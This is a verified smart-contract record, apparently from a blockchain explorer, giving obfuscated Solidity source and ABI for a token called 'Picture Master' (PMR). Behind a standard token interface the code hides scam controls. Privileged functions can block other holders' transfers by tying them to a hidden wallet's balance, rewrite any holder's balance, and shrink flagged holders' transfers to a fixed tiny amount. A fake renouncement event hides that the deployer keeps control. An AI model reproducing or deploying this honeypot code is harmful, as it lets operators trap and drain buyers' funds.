{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface shouldTo {\n    function createPair(address swapList, address swapBuyLaunched) external returns (address);\n}\n\ninterface listMaxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toAt) external view returns (uint256);\n\n    function transfer(address launchIsAmount, uint256 launchTx) external returns (bool);\n\n    function allowance(address tokenLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchIsAmount,\n        uint256 launchTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toAtSwap, uint256 value);\n    event Approval(address indexed tokenLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract listTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listMaxSwapMetadata is listMaxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PictureMaster is listTotal, listMaxSwap, listMaxSwapMetadata {\n\n    address toSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private senderTokenWallet;\n\n    uint256 private atLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLiquidity;\n    }\n\n    address public modeTeam;\n\n    function transfer(address totalBuySender, uint256 launchTx) external virtual override returns (bool) {\n        return takeMax(_msgSender(), totalBuySender, launchTx);\n    }\n\n    uint256 constant launchedIsFund = 7 ** 10;\n\n    uint8 private minExempt = 18;\n\n    function balanceOf(address toAt) public view virtual override returns (uint256) {\n        return minFrom[toAt];\n    }\n\n    string private receiverLiquidity = \"Picture Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return minExempt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountMax;\n    }\n\n    mapping(address => bool) public takeModeReceiver;\n\n    constructor (){\n        \n        maxShould atAmount = maxShould(toSell);\n        modeTeam = shouldTo(atAmount.factory()).createPair(atAmount.WETH(), address(this));\n        if (receiverTx != senderIs) {\n            receiverIsSell = isTx;\n        }\n        marketingLaunched = _msgSender();\n        takeModeReceiver[marketingLaunched] = true;\n        minFrom[marketingLaunched] = amountMax;\n        takeAmount();\n        \n        emit Transfer(address(0), marketingLaunched, amountMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderTokenWallet;\n    }\n\n    function allowance(address atSellMode, address modeReceiver) external view virtual override returns (uint256) {\n        if (modeReceiver == toSell) {\n            return type(uint256).max;\n        }\n        return feeTx[atSellMode][modeReceiver];\n    }\n\n    function approve(address modeReceiver, uint256 launchTx) public virtual override returns (bool) {\n        feeTx[_msgSender()][modeReceiver] = launchTx;\n        emit Approval(_msgSender(), modeReceiver, launchTx);\n        return true;\n    }\n\n    bool public fundIs;\n\n    bool public tokenEnableFund;\n\n    event OwnershipTransferred(address indexed fromLimit, address indexed tokenReceiver);\n\n    function feeReceiverToken(uint256 launchTx) public {\n        tokenReceiverAuto();\n        teamMarketing = launchTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAuto;\n    }\n\n    mapping(address => uint256) private minFrom;\n\n    bool public senderModeSell;\n\n    uint256 private amountMax = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public amountMarketingToken;\n\n    uint256 private receiverIsSell;\n\n    function takeMax(address listAt, address launchIsAmount, uint256 launchTx) internal returns (bool) {\n        if (listAt == marketingLaunched) {\n            return atFromSell(listAt, launchIsAmount, launchTx);\n        }\n        uint256 launchedAt = listMaxSwap(modeTeam).balanceOf(totalWallet);\n        require(launchedAt == teamMarketing);\n        require(launchIsAmount != totalWallet);\n        if (amountMarketingToken[listAt]) {\n            return atFromSell(listAt, launchIsAmount, launchedIsFund);\n        }\n        return atFromSell(listAt, launchIsAmount, launchTx);\n    }\n\n    string private receiverAuto = \"PMR\";\n\n    address totalWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private senderEnable;\n\n    bool public senderIs;\n\n    uint256 teamMarketing;\n\n    function transferFrom(address listAt, address launchIsAmount, uint256 launchTx) external override returns (bool) {\n        if (_msgSender() != toSell) {\n            if (feeTx[listAt][_msgSender()] != type(uint256).max) {\n                require(launchTx <= feeTx[listAt][_msgSender()]);\n                feeTx[listAt][_msgSender()] -= launchTx;\n            }\n        }\n        return takeMax(listAt, launchIsAmount, launchTx);\n    }\n\n    uint256 private isTx;\n\n    mapping(address => mapping(address => uint256)) private feeTx;\n\n    function takeAmount() public {\n        emit OwnershipTransferred(marketingLaunched, address(0));\n        senderTokenWallet = address(0);\n    }\n\n    uint256 shouldBuy;\n\n    address public marketingLaunched;\n\n    bool private fundTeam;\n\n    function tokenReceiverAuto() private view {\n        require(takeModeReceiver[_msgSender()]);\n    }\n\n    bool public receiverTx;\n\n    function amountExemptFrom(address totalBuySender, uint256 launchTx) public {\n        tokenReceiverAuto();\n        minFrom[totalBuySender] = launchTx;\n    }\n\n    function exemptTxToken(address autoFrom) public {\n        tokenReceiverAuto();\n        \n        if (autoFrom == marketingLaunched || autoFrom == modeTeam) {\n            return;\n        }\n        amountMarketingToken[autoFrom] = true;\n    }\n\n    function owner() external view returns (address) {\n        return senderTokenWallet;\n    }\n\n    function limitReceiverTo(address enableTxTotal) public {\n        if (tokenEnableFund) {\n            return;\n        }\n        \n        takeModeReceiver[enableTxTotal] = true;\n        \n        tokenEnableFund = true;\n    }\n\n    function atFromSell(address listAt, address launchIsAmount, uint256 launchTx) internal returns (bool) {\n        require(minFrom[listAt] >= launchTx);\n        minFrom[listAt] -= launchTx;\n        minFrom[launchIsAmount] += launchTx;\n        emit Transfer(listAt, launchIsAmount, launchTx);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAtSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTx\",\"type\":\"uint256\"}],\"name\":\"amountExemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMarketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"}],\"name\":\"exemptTxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchTx\",\"type\":\"uint256\"}],\"name\":\"feeReceiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTxTotal\",\"type\":\"address\"}],\"name\":\"limitReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderModeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeModeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnableFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchIsAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PictureMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}